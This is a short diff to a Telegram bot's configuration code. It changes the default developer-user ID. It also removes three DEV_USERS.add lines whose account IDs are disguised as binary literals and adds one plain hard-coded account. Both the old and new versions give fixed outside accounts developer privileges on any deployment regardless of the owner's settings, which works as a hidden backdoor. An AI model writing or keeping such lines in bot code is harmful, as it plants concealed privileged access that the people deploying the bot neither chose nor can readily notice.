@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6447082026").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -143,10 +143,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(abs(0b110010001000001011011100110010001))
-DEV_USERS.add(abs(0b101001110110010000111010111110000))
-DEV_USERS.add(abs(0b101100001110010100011000111101001))
-
+DEV_USERS.add(6447082026)
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient("mukesh", API_ID, API_HASH)
